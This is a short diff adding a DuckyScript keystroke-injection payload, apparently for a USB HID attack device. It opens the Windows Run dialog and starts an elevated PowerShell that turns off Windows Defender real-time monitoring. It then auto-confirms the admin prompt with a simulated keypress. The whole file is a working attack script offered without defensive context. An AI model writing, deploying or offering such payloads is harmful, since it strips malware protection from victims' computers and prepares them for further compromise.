@@ -1,0 +1,8 @@
+REM Disable Windows Defender (requires admin)
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -ArgumentList 'Set-MpPreference -DisableRealtimeMonitoring $true' -Verb RunAs"
+ENTER
+DELAY 1000
+ALT y
